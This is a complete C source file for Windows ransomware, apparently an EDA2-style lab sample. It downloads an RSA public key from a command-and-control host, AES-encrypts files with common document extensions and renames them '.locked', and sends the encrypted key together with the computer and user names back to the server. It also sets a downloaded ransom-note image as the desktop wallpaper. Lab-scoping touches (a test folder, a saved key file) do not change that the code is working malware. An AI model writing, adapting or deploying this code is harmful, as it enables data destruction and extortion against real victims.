#define _CRT_SECURE_NO_WARNINGS
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include <Lmcons.h>
#include <wininet.h>
#include <wincrypt.h>
#include <shlobj.h>
#include <stdbool.h>
#include <bcrypt.h>

#pragma comment(lib, "bcrypt.lib")
#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "shell32.lib")

// Constants and Global Variables
static bool OAEP = false;
const int KEY_SIZE = 2048;
char *public_key = NULL;
char *encrypted_key = NULL;
char *aes_key = NULL;
char user_name[UNLEN + 1];
char computer_name[MAX_COMPUTERNAME_LENGTH + 1];
const char *user_dir = "C:\\Users\\";
const char *generator_url = "http://c2.lab.local/panel/publickey";
const char *key_save_url = "http://c2.lab.local/panel/savekey";
const char *background_image_url = "http://c2.lab.local/panel/ransomnote";

// Function Prototypes
void form1_load();
void start_action();
char *get_public_key(const char *url);
void send_key(const char *url);
void encrypt_directory(const char *location, const char *key);
void encrypt_file(const char *file_path, const char *key);
unsigned char *aes_encrypt(const unsigned char *bytes_to_be_encrypted, size_t data_len, const unsigned char *key_bytes, size_t *out_len);
char *encrypt_key_rsa(const char *key, int key_size, const char *public_key_xml);
unsigned char *rsa_encrypt(const unsigned char *key_bytes, size_t key_bytes_len, int key_size, const char *public_key_xml, size_t *out_len);
char *generate_key(int length);
void set_wallpaper(const char *path);
void set_wallpaper_from_web(const char *url, const char *path);
char *base64_encode(const unsigned char *data, size_t input_length, size_t *output_length);
unsigned char *sha256_hash(const unsigned char *data, size_t len);
bool pbkdf2_sha256(const unsigned char *password, size_t pass_len, const unsigned char *salt, size_t salt_len, int iterations, unsigned char *derived, size_t derived_len);
static void print_crypto_error(const char *function);

// Helper for Base64 encoding
char *base64_encode(const unsigned char *data, size_t input_length, size_t *output_length)
{
    DWORD out_len = 0;
    char *encoded = NULL;

    if (!data || input_length == 0)
    {
        fprintf(stderr, "[!] base64_encode received invalid input\n");
        return NULL;
    }

    if (input_length > MAXDWORD)
    {
        fprintf(stderr, "[!] base64_encode input is too large\n");
        return NULL;
    }

    if (!CryptBinaryToStringA(data, (DWORD)input_length, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, NULL, &out_len))
    {
        print_crypto_error("CryptBinaryToStringA(size)");
        return NULL;
    }

    encoded = (char *)malloc(out_len);
    if (!encoded)
    {
        fprintf(stderr, "[!] malloc failed for Base64 buffer\n");
        return NULL;
    }

    if (!CryptBinaryToStringA(data, (DWORD)input_length, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, encoded, &out_len))
    {
        print_crypto_error("CryptBinaryToStringA(encode)");
        free(encoded);
        return NULL;
    }

    if (output_length)
        *output_length = out_len;

    return encoded;
}

// Helper for SHA256
unsigned char *sha256_hash(const unsigned char *data, size_t len)
{
    HCRYPTPROV hProv = 0;
    HCRYPTHASH hHash = 0;
    unsigned char *hash = NULL;
    DWORD hash_len = 32;

    if (!data || len == 0 || len > MAXDWORD)
    {
        fprintf(stderr, "[!] sha256_hash received invalid input\n");
        return NULL;
    }

    hash = (unsigned char *)malloc(32);
    if (!hash)
    {
        fprintf(stderr, "[!] malloc failed for SHA-256 buffer\n");
        return NULL;
    }

    if (!CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT))
    {
        print_crypto_error("CryptAcquireContext");
        goto error;
    }

    if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash))
    {
        print_crypto_error("CryptCreateHash(SHA256)");
        goto error;
    }

    if (!CryptHashData(hHash, data, (DWORD)len, 0))
    {
        print_crypto_error("CryptHashData");
        goto error;
    }

    if (!CryptGetHashParam(hHash, HP_HASHVAL, hash, &hash_len, 0))
    {
        print_crypto_error("CryptGetHashParam");
        goto error;
    }

    CryptDestroyHash(hHash);
    CryptReleaseContext(hProv, 0);
    return hash;

error:
    if (hHash)
        CryptDestroyHash(hHash);
    if (hProv)
        CryptReleaseContext(hProv, 0);
    free(hash);
    return NULL;
}

// PBKDF2-HMAC-SHA256 key derivation using Windows CNG
bool pbkdf2_sha256(const unsigned char *password, size_t pass_len,
                   const unsigned char *salt, size_t salt_len,
                   int iterations, unsigned char *derived,
                   size_t derived_len)
{
    BCRYPT_ALG_HANDLE hAlg = NULL;
    NTSTATUS status;

    if (!password || !salt || !derived || iterations <= 0)
        return false;

    status = BCryptOpenAlgorithmProvider(
        &hAlg,
        BCRYPT_SHA256_ALGORITHM,
        NULL,
        BCRYPT_ALG_HANDLE_HMAC_FLAG);

    if (status < 0)
    {
        printf("[!] BCryptOpenAlgorithmProvider(SHA256) failed: 0x%08lX\n",
               (unsigned long)status);
        return false;
    }

    status = BCryptDeriveKeyPBKDF2(
        hAlg,
        (PUCHAR)password,
        (ULONG)pass_len,
        (PUCHAR)salt,
        (ULONG)salt_len,
        (ULONGLONG)iterations,
        derived,
        (ULONG)derived_len,
        0);

    BCryptCloseAlgorithmProvider(hAlg, 0);

    if (status < 0)
    {
        printf("[!] BCryptDeriveKeyPBKDF2 failed: 0x%08lX\n",
               (unsigned long)status);
        return false;
    }

    return true;
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
    DWORD user_name_len = sizeof(user_name);
    if (!GetUserNameA(user_name, &user_name_len))
    {
        print_crypto_error("GetUserNameA");
        return 1;
    }

    DWORD comp_name_len = sizeof(computer_name);
    if (!GetComputerNameA(computer_name, &comp_name_len))
    {
        print_crypto_error("GetComputerNameA");
        return 1;
    }

    form1_load();
    return 0;
}

void form1_load()
{
    start_action();
}

char *get_public_key(const char *url)
{
    HINTERNET hInternet = NULL, hConnect = NULL;
    char *buffer = NULL;
    DWORD bytes_read = 0;

    if (!url){
        fprintf(stderr, "[!] get_public_key received NULL URL\n");
        return NULL;
    }

    hInternet = InternetOpenA("eda2-agent", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet){
        fprintf(stderr, "[!] InternetOpenA failed: %lu\n", GetLastError());
        goto cleanup;
    }

    hConnect = InternetOpenUrlA(hInternet, url, NULL, 0, INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE, 0);
    if (!hConnect){
        fprintf(stderr, "[!] InternetOpenUrlA failed: %lu\n", GetLastError());
        goto cleanup;
    }

    buffer = (char *)malloc(4096);
    if (!buffer){
        fprintf(stderr, "[!] malloc failed for public-key buffer\n");
        goto cleanup;
    }

    if (!InternetReadFile(hConnect, buffer, 4095, &bytes_read)){
        fprintf(stderr, "[!] InternetReadFile failed: %lu\n", GetLastError());
        free(buffer);
        buffer = NULL;
        goto cleanup;
    }

    if (bytes_read == 0){
        fprintf(stderr, "[!] Public-key response was empty\n");
        free(buffer);
        buffer = NULL;
        goto cleanup;
    }

    buffer[bytes_read] = '\0';
    printf("[+] Public key downloaded: %lu bytes\n", bytes_read);

cleanup:
    if (hConnect)
        InternetCloseHandle(hConnect);
    if (hInternet)
        InternetCloseHandle(hInternet);
    return buffer;
}

void send_key(const char *url)
{
    HINTERNET hInternet = NULL;
    HINTERNET hConnect = NULL;
    HINTERNET hRequest = NULL;

    URL_COMPONENTSA components;
    char host[256];
    char path[1024];

    memset(&components, 0, sizeof(components));
    memset(host, 0, sizeof(host));
    memset(path, 0, sizeof(path));

    components.dwStructSize = sizeof(components);

    components.lpszHostName = host;
    components.dwHostNameLength = sizeof(host);

    components.lpszUrlPath = path;
    components.dwUrlPathLength = sizeof(path);

    if (!InternetCrackUrlA(url, 0, 0, &components))
    {
        printf("InternetCrackUrlA failed: %lu\n", GetLastError());
        return;
    }

    printf("Host: %s\n", host);
    printf("Port: %u\n", components.nPort);
    printf("Path: %s\n", path);

    // Construct POST data
    char post_data[2048];
    sprintf(post_data, "pcname=%s&username=%s&aesencrypted=%s",
            computer_name, user_name, encrypted_key);

    const char *headers =
        "Content-Type: application/x-www-form-urlencoded\r\n";

    hInternet = InternetOpenA(
        "eda2-lab-agent",
        INTERNET_OPEN_TYPE_DIRECT,
        NULL,
        NULL,
        0);

    if (!hInternet)
    {
        printf("InternetOpenA failed: %lu\n", GetLastError());
        return;
    }

    hConnect = InternetConnectA(
        hInternet,
        host,
        components.nPort,
        NULL,
        NULL,
        INTERNET_SERVICE_HTTP,
        0,
        0);

    if (!hConnect)
    {
        printf("InternetConnectA failed: %lu\n", GetLastError());
        InternetCloseHandle(hInternet);
        return;
    }

    DWORD request_flags =
        INTERNET_FLAG_RELOAD |
        INTERNET_FLAG_NO_CACHE_WRITE;

    if (components.nScheme == INTERNET_SCHEME_HTTPS)
        request_flags |= INTERNET_FLAG_SECURE;

    hRequest = HttpOpenRequestA(
        hConnect,
        "POST",
        path,
        NULL,
        NULL,
        NULL,
        request_flags,
        0);

    if (!hRequest)
    {
        printf("HttpOpenRequestA failed: %lu\n", GetLastError());
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        return;
    }

    BOOL result = HttpSendRequestA(
        hRequest,
        headers,
        (DWORD)-1L,
        (LPVOID)post_data,
        (DWORD)strlen(post_data));

    if (!result)
    {
        printf("HttpSendRequestA failed: %lu\n", GetLastError());
    }
    else
    {
        printf("POST sent successfully.\n");

        DWORD status_code = 0;
        DWORD status_size = sizeof(status_code);

        if (HttpQueryInfoA(
                hRequest,
                HTTP_QUERY_STATUS_CODE | HTTP_QUERY_FLAG_NUMBER,
                &status_code,
                &status_size,
                NULL))
        {
            printf("HTTP status: %lu\n", status_code);
        }
    }

    InternetCloseHandle(hRequest);
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);
}

void start_action()
{
    const char *data_path = "C:\\Users\\Public\\A01_TestData";
    FILE *f = NULL;

    public_key = get_public_key(generator_url);
    if (!public_key)
    {
        fprintf(stderr, "[!] Failed to retrieve public key\n");
        goto cleanup;
    }

    aes_key = generate_key(32);
    if (!aes_key)
    {
        fprintf(stderr, "[!] Failed to generate AES key\n");
        goto cleanup;
    }

    const char *key_path = "C:\\Users\\Public\\A01_6_Lab_Encryption_Key.txt";
    f = fopen(key_path, "w");
    if (!f)
    {
        fprintf(stderr, "[!] Failed to create key file: %s\n", key_path);
        goto cleanup;
    }
    if (fputs(aes_key, f) == EOF)
    {
        fprintf(stderr, "[!] Failed to write AES key file\n");
        fclose(f);
        f = NULL;
        goto cleanup;
    }
    fclose(f);
    f = NULL;

    DWORD dwAttrib = GetFileAttributesA(data_path);
    if (dwAttrib == INVALID_FILE_ATTRIBUTES || !(dwAttrib & FILE_ATTRIBUTE_DIRECTORY))
    {
        fprintf(stderr, "[!] Test directory not found: %s\n", data_path);
        goto cleanup;
    }

    encrypt_directory(data_path, aes_key);

    encrypted_key = encrypt_key_rsa(aes_key, KEY_SIZE, public_key);
    if (!encrypted_key)
    {
        fprintf(stderr, "[!] Failed to RSA-encrypt AES key\n");
        goto cleanup;
    }
    else{
        send_key(key_save_url);
    }

    char background_image_name[MAX_PATH];
    sprintf(background_image_name, "%s%s\\ransom.jpg", user_dir, user_name);
    set_wallpaper_from_web(background_image_url, background_image_name);

    printf("[+] Cryptographic fixture completed successfully\n");

cleanup:
    if (f)
        fclose(f);

    if (aes_key)
    {
        SecureZeroMemory(aes_key, strlen(aes_key));
        free(aes_key);
        aes_key = NULL;
    }

    if (encrypted_key)
    {
        SecureZeroMemory(encrypted_key, strlen(encrypted_key));
        free(encrypted_key);
        encrypted_key = NULL;
    }

    if (public_key)
    {
        free(public_key);
        public_key = NULL;
    }

    exit(0);
}

void encrypt_file(const char *file_path, const char *key)
{
    if (strstr(file_path, ".locked") != NULL)
    {
        return;
    }

    FILE *f = fopen(file_path, "rb");
    if (!f)
        return;
    fseek(f, 0, SEEK_END);
    long fsize = ftell(f);
    fseek(f, 0, SEEK_SET);

    unsigned char *bytes_to_be_encrypted = (unsigned char *)malloc(fsize);
    fread(bytes_to_be_encrypted, 1, fsize, f);
    fclose(f);

    unsigned char *key_bytes = (unsigned char *)strdup(key);
    unsigned char *hashed_key = sha256_hash(key_bytes, strlen(key));

    size_t encrypted_len = 0;
    unsigned char *bytes_encrypted = aes_encrypt(bytes_to_be_encrypted, fsize, hashed_key, &encrypted_len);

    f = fopen(file_path, "wb");
    if (f)
    {
        fwrite(bytes_encrypted, 1, encrypted_len, f);
        fclose(f);
    }

    char new_name[MAX_PATH];
    sprintf(new_name, "%s.locked", file_path);
    rename(file_path, new_name);

    free(bytes_to_be_encrypted);
    free(key_bytes);
    free(hashed_key);
    free(bytes_encrypted);
}

void encrypt_directory(const char *location, const char *key)
{
    const char *valid_extensions[] = {
        ".txt", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx",
        ".odt", ".jpg", ".png", ".csv", ".sql", ".mdb", ".sln",
        ".php", ".asp", ".aspx", ".html", ".xml", ".psd"};

    WIN32_FIND_DATAA find_data;
    char search_path[MAX_PATH];
    sprintf(search_path, "%s\\*", location);
    HANDLE hFind = FindFirstFileA(search_path, &find_data);

    if (hFind != INVALID_HANDLE_VALUE)
    {
        do
        {
            if (strcmp(find_data.cFileName, ".") == 0 || strcmp(find_data.cFileName, "..") == 0)
                continue;

            char full_path[MAX_PATH];
            sprintf(full_path, "%s\\%s", location, find_data.cFileName);

            if (find_data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
            {
                encrypt_directory(full_path, key);
            }
            else
            {
                char *ext = strrchr(find_data.cFileName, '.');
                if (ext)
                {
                    for (int i = 0; i < 20; i++)
                    {
                        if (_stricmp(ext, valid_extensions[i]) == 0)
                        {
                            encrypt_file(full_path, key);
                            break;
                        }
                    }
                }
            }
        } while (FindNextFileA(hFind, &find_data));
        FindClose(hFind);
    }
}

unsigned char *aes_encrypt(const unsigned char *plaintext,
                           size_t plaintext_len,
                           const unsigned char *key_bytes,
                           size_t *out_len)
{
    BCRYPT_ALG_HANDLE hAlg = NULL;
    BCRYPT_KEY_HANDLE hKey = NULL;
    unsigned char salt[] = {1, 2, 3, 4, 5, 6, 7, 8};
    unsigned char derived[48];
    unsigned char iv[16];

    unsigned char *ciphertext = NULL;
    DWORD ciphertext_len = 0;
    DWORD result_len = 0;
    NTSTATUS status;

    if (!plaintext || !key_bytes || !out_len)
        return NULL;

    *out_len = 0;

    /*
     * 32 bytes AES-256 key
     * 16 bytes IV
     */
    if (!pbkdf2_sha256(
            key_bytes, 32,
            salt, sizeof(salt),
            1000,
            derived, sizeof(derived)))
    {
        printf("[!] PBKDF2 failed\n");
        return NULL;
    }

    /*
     * derived[0..31]  = AES-256 key
     * derived[32..47] = CBC IV
     */
    memcpy(iv, derived + 32, sizeof(iv));

    status = BCryptOpenAlgorithmProvider(
        &hAlg,
        BCRYPT_AES_ALGORITHM,
        NULL,
        0);

    if (status < 0)
    {
        printf("[!] BCryptOpenAlgorithmProvider(AES) failed: 0x%08lX\n",
               (unsigned long)status);
        goto cleanup;
    }

    status = BCryptSetProperty(
        hAlg,
        BCRYPT_CHAINING_MODE,
        (PUCHAR)BCRYPT_CHAIN_MODE_CBC,
        sizeof(BCRYPT_CHAIN_MODE_CBC),
        0);

    if (status < 0)
    {
        printf("[!] BCryptSetProperty(CBC) failed: 0x%08lX\n",
               (unsigned long)status);
        goto cleanup;
    }

    status = BCryptGenerateSymmetricKey(
        hAlg,
        &hKey,
        NULL,
        0,
        derived,
        32,
        0);

    if (status < 0)
    {
        printf("[!] BCryptGenerateSymmetricKey failed: 0x%08lX\n",
               (unsigned long)status);
        goto cleanup;
    }

    /*
     * First call determines how much ciphertext storage is needed.
     *
     * BLOCK_PADDING gives us PKCS-style block padding.
     */
    status = BCryptEncrypt(
        hKey,
        (PUCHAR)plaintext,
        (ULONG)plaintext_len,
        NULL,
        iv,
        sizeof(iv),
        NULL,
        0,
        &ciphertext_len,
        BCRYPT_BLOCK_PADDING);

    if (status < 0)
    {
        printf("[!] BCryptEncrypt(size) failed: 0x%08lX\n",
               (unsigned long)status);
        goto cleanup;
    }

    ciphertext = (unsigned char *)malloc(ciphertext_len);
    if (!ciphertext)
    {
        printf("[!] Could not allocate ciphertext buffer\n");
        goto cleanup;
    }

    /*
     * BCryptEncrypt modifies the IV buffer, so restore it before
     * the actual encryption call.
     */
    memcpy(iv, derived + 32, sizeof(iv));

    status = BCryptEncrypt(
        hKey,
        (PUCHAR)plaintext,
        (ULONG)plaintext_len,
        NULL,
        iv,
        sizeof(iv),
        ciphertext,
        ciphertext_len,
        &result_len,
        BCRYPT_BLOCK_PADDING);

    if (status < 0)
    {
        printf("[!] BCryptEncrypt failed: 0x%08lX\n",
               (unsigned long)status);

        free(ciphertext);
        ciphertext = NULL;
        goto cleanup;
    }

    *out_len = result_len;

    printf("[+] AES-256-CBC encryption successful\n");
    printf("[+] Plaintext:  %zu bytes\n", plaintext_len);
    printf("[+] Ciphertext: %lu bytes\n", result_len);

cleanup:
    /*
     * Clear derived key material before returning.
     */
    SecureZeroMemory(derived, sizeof(derived));
    SecureZeroMemory(iv, sizeof(iv));

    if (hKey)
        BCryptDestroyKey(hKey);

    if (hAlg)
        BCryptCloseAlgorithmProvider(hAlg, 0);

    return ciphertext;
}

char *encrypt_key_rsa(const char *key, int key_size, const char *public_key_xml)
{
    size_t out_len = 0;
    unsigned char *encrypted = NULL;
    char *base64 = NULL;

    if (!key || !public_key_xml || key_size <= 0)
    {
        fprintf(stderr, "[!] encrypt_key_rsa received invalid argument\n");
        return NULL;
    }

    encrypted = rsa_encrypt((const unsigned char *)key, strlen(key), key_size, public_key_xml, &out_len);
    if (!encrypted || out_len == 0)
    {
        fprintf(stderr, "[!] RSA key encryption failed\n");
        return NULL;
    }

    base64 = base64_encode(encrypted, out_len, NULL);
    SecureZeroMemory(encrypted, out_len);
    free(encrypted);

    if (!base64)
    {
        fprintf(stderr, "[!] RSA ciphertext Base64 encoding failed\n");
        return NULL;
    }

    return base64;
}

static void print_crypto_error(const char *function)
{
    DWORD error = GetLastError();
    char *message = NULL;

    FormatMessageA(
        FORMAT_MESSAGE_ALLOCATE_BUFFER |
            FORMAT_MESSAGE_FROM_SYSTEM |
            FORMAT_MESSAGE_IGNORE_INSERTS,
        NULL, error, 0, (LPSTR)&message, 0, NULL);

    if (message)
    {
        fprintf(stderr, "[!] %s failed: %lu (0x%08lX): %s",
                function, error, error, message);
        LocalFree(message);
    }
    else
    {
        fprintf(stderr, "[!] %s failed: %lu (0x%08lX)\n",
                function, error, error);
    }
}

static char *extract_xml_value(const char *xml, const char *open_tag,
                               const char *close_tag)
{
    const char *start = strstr(xml, open_tag);
    if (!start)
    {
        fprintf(stderr, "[!] XML tag not found: %s\n", open_tag);
        return NULL;
    }

    start += strlen(open_tag);

    const char *end = strstr(start, close_tag);
    if (!end || end <= start)
    {
        fprintf(stderr, "[!] XML closing tag not found or invalid: %s\n",
                close_tag);
        return NULL;
    }

    size_t len = (size_t)(end - start);
    char *value = (char *)malloc(len + 1);

    if (!value)
    {
        fprintf(stderr, "[!] malloc failed while parsing XML\n");
        return NULL;
    }

    memcpy(value, start, len);
    value[len] = '\0';

    return value;
}

static BYTE *decode_base64(const char *base64, DWORD *decoded_len)
{
    BYTE *decoded = NULL;
    DWORD required = 0;

    if (!CryptStringToBinaryA(base64, 0, CRYPT_STRING_BASE64,
                              NULL, &required, NULL, NULL))
    {
        print_crypto_error("CryptStringToBinaryA(size)");
        return NULL;
    }

    decoded = (BYTE *)malloc(required);
    if (!decoded)
    {
        fprintf(stderr, "[!] malloc failed allocating %lu Base64 bytes\n",
                required);
        return NULL;
    }

    if (!CryptStringToBinaryA(base64, 0, CRYPT_STRING_BASE64,
                              decoded, &required, NULL, NULL))
    {
        print_crypto_error("CryptStringToBinaryA(decode)");
        free(decoded);
        return NULL;
    }

    *decoded_len = required;
    return decoded;
}

static BOOL exponent_to_dword(const BYTE *exponent, DWORD exponent_len,
                              DWORD *result)
{
    if (!exponent || !result || exponent_len == 0 ||
        exponent_len > sizeof(DWORD))
    {
        fprintf(stderr, "[!] Invalid RSA public exponent length: %lu\n",
                exponent_len);
        return FALSE;
    }

    DWORD value = 0;

    /* RSAKeyValue stores the exponent in big-endian order. */
    for (DWORD i = 0; i < exponent_len; i++)
        value = (value << 8) | exponent[i];

    *result = value;
    return TRUE;
}

static HCRYPTKEY import_rsa_xml_public_key(HCRYPTPROV hProv,
                                           const char *public_key_xml)
{
    char *modulus_b64 = NULL;
    char *exponent_b64 = NULL;
    BYTE *modulus = NULL;
    BYTE *exponent = NULL;
    BYTE *blob = NULL;

    DWORD modulus_len = 0;
    DWORD exponent_len = 0;
    DWORD public_exponent = 0;
    HCRYPTKEY hKey = 0;

    if (!public_key_xml)
    {
        fprintf(stderr, "[!] Public-key XML is NULL\n");
        return 0;
    }

    modulus_b64 = extract_xml_value(
        public_key_xml, "<Modulus>", "</Modulus>");

    exponent_b64 = extract_xml_value(
        public_key_xml, "<Exponent>", "</Exponent>");

    if (!modulus_b64 || !exponent_b64)
        goto cleanup;

    modulus = decode_base64(modulus_b64, &modulus_len);
    exponent = decode_base64(exponent_b64, &exponent_len);

    if (!modulus || !exponent)
        goto cleanup;

    if (!exponent_to_dword(exponent, exponent_len, &public_exponent))
        goto cleanup;

    printf("[+] RSA modulus: %lu bits\n", modulus_len * 8);
    printf("[+] RSA exponent: %lu\n", public_exponent);

    DWORD blob_len = sizeof(PUBLICKEYSTRUC) +
                     sizeof(RSAPUBKEY) +
                     modulus_len;

    blob = (BYTE *)calloc(1, blob_len);
    if (!blob)
    {
        fprintf(stderr, "[!] calloc failed allocating PUBLICKEYBLOB\n");
        goto cleanup;
    }

    PUBLICKEYSTRUC *blob_header = (PUBLICKEYSTRUC *)blob;
    blob_header->bType = PUBLICKEYBLOB;
    blob_header->bVersion = CUR_BLOB_VERSION;
    blob_header->reserved = 0;
    blob_header->aiKeyAlg = CALG_RSA_KEYX;

    RSAPUBKEY *rsa_header =
        (RSAPUBKEY *)(blob + sizeof(PUBLICKEYSTRUC));

    rsa_header->magic = 0x31415352; /* RSA1 */
    rsa_header->bitlen = modulus_len * 8;
    rsa_header->pubexp = public_exponent;

    BYTE *blob_modulus = blob +
                         sizeof(PUBLICKEYSTRUC) +
                         sizeof(RSAPUBKEY);

    /*
     * .NET RSAKeyValue modulus = big endian.
     * CryptoAPI PUBLICKEYBLOB modulus = little endian.
     */
    for (DWORD i = 0; i < modulus_len; i++)
        blob_modulus[i] = modulus[modulus_len - 1 - i];

    if (!CryptImportKey(hProv, blob, blob_len, 0, 0, &hKey))
    {
        print_crypto_error("CryptImportKey");
        hKey = 0;
        goto cleanup;
    }

    printf("[+] RSA public key imported successfully\n");

cleanup:
    free(blob);
    free(modulus);
    free(exponent);
    free(modulus_b64);
    free(exponent_b64);

    return hKey;
}

unsigned char *rsa_encrypt(const unsigned char *key_bytes,
                           size_t key_bytes_len,
                           int key_size,
                           const char *public_key_xml,
                           size_t *out_len)
{
    HCRYPTPROV hProv = 0;
    HCRYPTKEY hKey = 0;
    unsigned char *encrypted = NULL;

    if (!key_bytes || !public_key_xml || !out_len)
    {
        fprintf(stderr, "[!] rsa_encrypt received invalid argument\n");
        return NULL;
    }

    *out_len = 0;

    if (!CryptAcquireContextA(&hProv, NULL, NULL, PROV_RSA_AES,
                              CRYPT_VERIFYCONTEXT))
    {
        print_crypto_error("CryptAcquireContextA");
        return NULL;
    }

    printf("[+] CryptoAPI provider acquired\n");

    hKey = import_rsa_xml_public_key(hProv, public_key_xml);
    if (!hKey)
        goto cleanup;

    DWORD buffer_len = (DWORD)(key_size / 8);
    DWORD data_len = (DWORD)key_bytes_len;

    if (key_bytes_len > buffer_len)
    {
        fprintf(stderr,
                "[!] Input (%zu bytes) exceeds RSA buffer (%lu bytes)\n",
                key_bytes_len, buffer_len);
        goto cleanup;
    }

    encrypted = (unsigned char *)malloc(buffer_len);
    if (!encrypted)
    {
        fprintf(stderr, "[!] malloc failed allocating RSA buffer\n");
        goto cleanup;
    }

    memset(encrypted, 0, buffer_len);
    memcpy(encrypted, key_bytes, key_bytes_len);

    if (!CryptEncrypt(hKey, 0, TRUE, 0, encrypted,
                      &data_len, buffer_len))
    {
        print_crypto_error("CryptEncrypt");
        free(encrypted);
        encrypted = NULL;
        goto cleanup;
    }

    *out_len = data_len;
    printf("[+] RSA encryption successful: %lu bytes\n", data_len);

cleanup:
    if (hKey)
        CryptDestroyKey(hKey);

    if (hProv)
        CryptReleaseContext(hProv, 0);

    return encrypted;
}

char *generate_key(int length)
{
    const char *valid = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/";
    char *res = NULL;
    size_t valid_len;

    if (length <= 0)
    {
        fprintf(stderr, "[!] generate_key received invalid length\n");
        return NULL;
    }

    valid_len = strlen(valid);
    res = (char *)malloc((size_t)length + 1);

    if (!res)
    {
        fprintf(stderr, "[!] malloc failed in generate_key\n");
        return NULL;
    }

    srand((unsigned int)GetTickCount());

    for (int i = 0; i < length; i++)
        res[i] = valid[rand() % valid_len];

    res[length] = '\0';
    return res;
}

void set_wallpaper(const char *path)
{
    SystemParametersInfoA(SPI_SETDESKWALLPAPER, 0, (void *)path, SPIF_UPDATEINIFILE | SPIF_SENDCHANGE);
}

void set_wallpaper_from_web(const char *url, const char *path)
{
    HINTERNET hInternet = InternetOpenA("eda2-agent", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    HINTERNET hConnect = InternetOpenUrlA(hInternet, url, NULL, 0, INTERNET_FLAG_RELOAD, 0);

    FILE *f = fopen(path, "wb");
    if (f)
    {
        char buffer[4096];
        DWORD bytesRead;
        while (InternetReadFile(hConnect, buffer, 4096, &bytesRead) && bytesRead > 0)
        {
            fwrite(buffer, 1, bytesRead, f);
        }
        fclose(f);
    }

    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);

    if (GetFileAttributesA(path) != INVALID_FILE_ATTRIBUTES)
    {
        set_wallpaper(path);
    }
}
